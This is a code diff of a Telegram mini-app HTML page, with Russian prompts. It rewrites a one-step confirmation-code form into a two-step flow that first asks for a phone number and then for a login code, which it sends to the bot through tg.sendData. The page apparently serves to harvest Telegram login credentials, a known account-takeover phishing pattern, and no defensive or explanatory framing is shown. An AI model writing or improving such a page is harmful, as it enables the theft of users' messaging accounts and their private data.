@@ -4,21 +4,44 @@
     <meta charset="UTF-8">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; background: var(--tg-theme-bg-color); color: var(--tg-theme-text-color); padding: 20px; text-align: center; }
-        input { width: 80%; padding: 15px; font-size: 20px; border-radius: 10px; border: 1px solid #248bcf; margin-bottom: 20px; text-align: center; }
-        button { background: #248bcf; color: white; border: none; padding: 15px 25px; border-radius: 10px; font-size: 18px; width: 85%; cursor: pointer; }
+        .step { display: none; }
+        .step.active { display: block; }
     </style>
 </head>
 <body>
-    <h3>Введите код подтверждения</h3>
-    <input type="number" id="c" placeholder="12345" />
-    <button onclick="s()">ПОДТВЕРДИТЬ</button>
+    <div id="app">
+        <div id="step-phone" class="step active">
+            <h3>Введите номер</h3>
+            <input type="tel" id="phone" placeholder="+7..." />
+            <button onclick="nextStep('phone')">Далее</button>
+        </div>
+
+        <div id="step-code" class="step">
+            <h3>Введите код</h3>
+            <input type="number" id="code" placeholder="12345" />
+            <button onclick="nextStep('code')">Подтвердить</button>
+        </div>
+    </div>
+
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-        function s() {
-            const v = document.getElementById('c').value;
-            if (v) { tg.sendData(v); tg.close(); }
+
+        async function nextStep(type) {
+            const val = document.getElementById(type).value;
+            
+            console.log("Отправка " + type + ": " + val);
+
+            if(type === 'phone') {
+                showStep('code');
+            } else {
+                tg.sendData(val);
+            }
+        }
+
+        function showStep(id) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step-' + id).classList.add('active');
         }
     </script>
 </body>
